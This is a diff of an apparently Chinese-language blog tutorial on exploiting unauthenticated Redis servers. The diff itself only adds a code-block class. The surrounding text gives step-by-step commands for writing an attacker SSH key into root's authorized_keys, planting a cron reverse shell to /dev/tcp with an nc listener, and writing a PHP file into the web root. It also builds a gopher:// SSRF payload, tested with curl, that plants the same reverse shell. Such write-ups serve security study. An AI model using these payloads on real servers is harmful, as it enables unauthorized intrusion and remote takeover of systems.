@@ -312,7 +312,7 @@
 <li>没有设置密码认证，可以免密码远程登录Redis服务</li>
 <li>以root身份运行Redis</li>
 </ol>
-<h2 id="Redis简单命令了解"><a href="#Redis简单命令了解" class="headerlink" title="Redis简单命令了解"></a>Redis简单命令了解</h2><pre><code>查看版本信息
+<h2 id="Redis简单命令了解"><a href="#Redis简单命令了解" class="headerlink" title="Redis简单命令了解"></a>Redis简单命令了解</h2><pre><code class="shell">查看版本信息
 127.0.0.1:6379&gt; info
 清空所有Redis数据库的所有key 慎用
 127.0.0.1:6379&gt; flushall
@@ -334,14 +334,14 @@ protected-mode no</code></pre>
 <p>需要允许除本地外的主机远程连接redis服务</p>
 <h2 id="利用Redis实现SSH"><a href="#利用Redis实现SSH" class="headerlink" title="利用Redis实现SSH"></a>利用Redis实现SSH</h2><p><strong><u>Victim: Ubuntu</u></strong></p>
 <p><strong>root身份运行Redis服务器</strong></p>
-<pre><code>$ sudo redis-server /etc/redis.conf</code></pre>
+<pre><code class="shell">$ sudo redis-server /etc/redis.conf</code></pre>
 <p><strong>Attacker本地生成一堆密钥</strong></p>
-<pre><code>root@kali:~# ssh-keygen -t rsa</code></pre>
+<pre><code class="shell">root@kali:~# ssh-keygen -t rsa</code></pre>
 <p><strong>id_rsa.pub</strong></p>
-<pre><code>root@kali:~/.ssh# cat id_rsa.pub 
+<pre><code class="shell">root@kali:~/.ssh# cat id_rsa.pub 
 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDxjYQf2AMNmfzla+Vi7zJdJWn2OB5jW8EZ5rxAtvIear3BS6JfJ197HyiAqGkMRnb/Y5F//0yJ+Amx1+eo2deUYRo/DfUuIQeRipitysNF2lxhKhBdk4O+L4QuuLqeIf0pg9dB0zSVmnThlwTo9P21V8hIXVWozmaEV8j+hb+SCFN50mqPfnQ0Wmkq3A1QTLkvLJI/EzWFqzNc46/re7Dvs05hs1kmioDFG+gsx75z3WI98g8eW/C8SWLZ3F9cV36ZeNspmqrrKCxKwZxoaOAHA+ZdOF3SkGa0FRG/pbLgV3djDv9yfNgmaqilzR7CQblaBHnuSY/AZLxF49drV+pCtuOd9Lh6g7d7PwoxaOJyIjhsf2g9bDm7IrrSsWMtkOkMg883ge/ow5TVRZLFugvRRy+yb2loiXIGd3hodvN5c7g709WlbVBhvXYMFxfPYEe/gglcoPmaB23647uDvBAbn8JhAeTw2RVqqJxCziabVaWg2MM3Tb6xK2yszrrSPrs= root@kali</code></pre>
 <p><strong>Redis连接并将公钥写入Victim</strong></p>
-<pre><code>root@kali:~/.ssh# redis-cli -h 139.xxx.xx.xxx
+<pre><code class="shell">root@kali:~/.ssh# redis-cli -h 139.xxx.xx.xxx
 139.xxx.xx.xxx:6379&gt; config set dir /root/.ssh
 OK
 139.xxx.xx.xxx:6379&gt; config set dbfilename authorized_keys
@@ -352,13 +352,13 @@ OK
 139.xxx.xx.xxx:6379&gt; save
 OK</code></pre>
 <p><strong>SSH连接Victim</strong></p>
-<pre><code>root@kali:~/.ssh# ssh -i id_rsa root@139.xxx.xx.xxx
+<pre><code class="shell">root@kali:~/.ssh# ssh -i id_rsa root@139.xxx.xx.xxx
 Welcome to Ubuntu</code></pre>
 <h2 id="利用Redis实现反弹Shell"><a href="#利用Redis实现反弹Shell" class="headerlink" title="利用Redis实现反弹Shell"></a>利用Redis实现反弹Shell</h2><p><strong><u>Victim: CentOS</u></strong></p>
 <p><strong>root身份运行Redis服务器</strong></p>
-<pre><code>[root@centos centos]# redis-server /etc/redis.conf</code></pre>
+<pre><code class="shell">[root@centos centos]# redis-server /etc/redis.conf</code></pre>
 <p><strong>Redis连接并写入反弹Shell</strong></p>
-<pre><code>10.173.168.6:6379&gt; set x &quot;\n* * * * * /bin/bash -i &gt; /dev/tcp/10.173.168.12/23 0&lt;&amp;1 2&gt;&amp;1\n&quot;
+<pre><code class="shell">10.173.168.6:6379&gt; set x &quot;\n* * * * * /bin/bash -i &gt; /dev/tcp/10.173.168.12/23 0&lt;&amp;1 2&gt;&amp;1\n&quot;
 OK
 10.173.168.6:6379&gt; config set dir /var/spool/cron/
 OK
@@ -367,7 +367,7 @@ OK
 10.173.168.6:6379&gt; save
 OK</code></pre>
 <p><strong>监听23端口并等待反弹Shell</strong></p>
-<pre><code>root@kali:~# nc -lvp 23</code></pre>
+<pre><code class="shell">root@kali:~# nc -lvp 23</code></pre>
 <p><img src="https://img2020.cnblogs.com/blog/2022894/202004/2022894-20200428132956742-1735705839.png"></p>
 <h3 id="反弹Shell在Ubuntu下无法实现"><a href="#反弹Shell在Ubuntu下无法实现" class="headerlink" title="反弹Shell在Ubuntu下无法实现"></a>反弹Shell在Ubuntu下无法实现</h3><p>由于系统的不同，定时文件位置也不同</p>
 <ul>
@@ -380,7 +380,7 @@ OK</code></pre>
 <h2 id="利用Redis写入WebShell"><a href="#利用Redis写入WebShell" class="headerlink" title="利用Redis写入WebShell"></a>利用Redis写入WebShell</h2><p>当<code>redis-server</code>以非root身份运行时，无法将<code>/var/spool/cron/</code>以及<code>/root/.ssh</code>设置为本地存储文件夹但可以写入一句话木马</p>
 <p><strong><u>Victim: Ubuntu</u></strong></p>
 <p><strong>Redis连接并写入一句话</strong></p>
-<pre><code>139.xxx.xx.xxx:6379&gt; set x &quot;&lt;?php phpinfo();?&gt;&quot;
+<pre><code class="shell">139.xxx.xx.xxx:6379&gt; set x &quot;&lt;?php phpinfo();?&gt;&quot;
 OK
 139.xxx.xx.xxx:6379&gt; config set dir /var/www/html
 OK
@@ -392,7 +392,7 @@ OK</code></pre>
 <h2 id="Redis未授权漏洞与SSRF的综合利用"><a href="#Redis未授权漏洞与SSRF的综合利用" class="headerlink" title="Redis未授权漏洞与SSRF的综合利用"></a>Redis未授权漏洞与SSRF的综合利用</h2><h3 id="了解SSRF"><a href="#了解SSRF" class="headerlink" title="了解SSRF"></a>了解SSRF</h3><p>SSRF(Server-Side Request Forgery服务器端请求伪造)是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是外网无法访问的内部系统(正因是由服务端发起的，所以能够请求到与其相连而与外网隔离的内部系统)</p>
 <p>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容或加载指定地址的图片</p>
 <p><strong>常见格式</strong></p>
-<pre><code>http://xxx.xxx.xx.xxx/index.php?url=</code></pre>
+<pre><code class="shell">http://xxx.xxx.xx.xxx/index.php?url=</code></pre>
 <h3 id="RESP协议"><a href="#RESP协议" class="headerlink" title="RESP协议"></a>RESP协议</h3><p>Redis服务器与客户端通过RESP（REdis Serialization Protocol）协议通信<br>RESP协议在Redis 1.2中引入后成为Redis服务器通信的标准方式，其主要可序列化以下数据类型：整数，单行回复(简单字符串)，数组，错误信息，多行字符串；RESP协议每部分都以 “\r\n” (CRLF) 结尾</p>
 <p>RESP在Redis中用作请求 - 响应协议的方式：</p>
 <ol>
@@ -409,9 +409,9 @@ OK</code></pre>
 </ul>
 <p><strong>在RESP中，协议的不同部分始终以”\r\n”(CRLF)结束</strong></p>
 <h4 id="tcpdump抓取流量包"><a href="#tcpdump抓取流量包" class="headerlink" title="tcpdump抓取流量包"></a>tcpdump抓取流量包</h4><p><strong>抓取6379端口流量</strong></p>
-<pre><code>tcpdump port 6379 -w resp.pcap</code></pre>
+<pre><code class="shell">tcpdump port 6379 -w resp.pcap</code></pre>
 <p><strong>连接远程Redis</strong></p>
-<pre><code>xxx.xxx.xx.xxx:6379&gt; set name hacker
+<pre><code class="shell">xxx.xxx.xx.xxx:6379&gt; set name hacker
 OK
 xxx.xxx.xx.xxx:6379&gt; get name
 &quot;hacker&quot;
@@ -464,7 +464,7 @@ redis-cli -h $1 -p $2 quit</code></pre>
 <pre><code>[root@centos spool]# socat -v tcp-listen:2333,fork tcp-connect:127.0.0.1:6379</code></pre>
 <p>socat将本地2333端口转发到6379端口，访问本地2333端口实际上是访问6379端口</p>
 <p><strong>执行反弹shell</strong></p>
-<pre><code>bash shell.sh 127.0.0.1 2333</code></pre>
+<pre><code class="shell">bash shell.sh 127.0.0.1 2333</code></pre>
 <p><strong>获取流量(处理过，注意payload结尾回车)</strong></p>
 <pre><code>*3\r
 $3\r
@@ -530,7 +530,7 @@ print(&quot;gopher://127.0.0.1:6379/_&quot; + exp.replace(&#39;$&#39;, &#39;%24&
 <p><strong>curl测试转换结果</strong></p>
 <pre><code>curl -v &quot;gopher://127.0.0.1:6379/_*3%0d%0a%243%0d%0aset%0d%0a%241%0d%0a1%0d%0a%2456%0d%0a%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/23 0&gt;&amp;1%0a%0a%0a%0a%0d%0a*4%0d%0a%246%0d%0aconfig%0d%0a%243%0d%0aset%0d%0a%243%0d%0adir%0d%0a%2416%0d%0a/var/spool/cron/%0d%0a*4%0d%0a%246%0d%0aconfig%0d%0a%243%0d%0aset%0d%0a%2410%0d%0adbfilename%0d%0a%244%0d%0aroot%0d%0a*1%0d%0a%244%0d%0asave%0d%0a&quot;</code></pre>
 <p><strong>反弹成功</strong></p>
-<pre><code>[root@centos ~]# ^C
+<pre><code class="shell">[root@centos ~]# ^C
 [root@centos spool]# nc -lvp 23
 Ncat: Version 7.50 ( https://nmap.org/ncat )
 Ncat: Listening on :::23
